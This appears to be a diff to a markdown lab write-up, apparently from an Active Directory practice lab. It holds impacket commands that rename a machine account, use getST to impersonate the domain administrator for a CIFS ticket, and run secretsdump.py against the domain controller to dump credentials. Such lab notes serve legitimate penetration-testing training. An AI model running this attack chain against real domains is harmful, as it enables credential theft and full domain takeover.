@@ -136,5 +136,14 @@ renameMachine.py -current-name 'winterfell' -new-name 'samaccount$' north.sevenk
 export KRB5CCNAME=/workspace/winterfell.ccache
 ```
 ```bash
-getST -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug
+impacket-getST -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug
 ```
+![[Pasted image 20230825170523.png]]
+```bash
+export KRB5CCNAME=/workspace/administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
+```
+```bash
+secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenkingdoms.local'
+```
+![[Pasted image 20230825170548.png]]
+
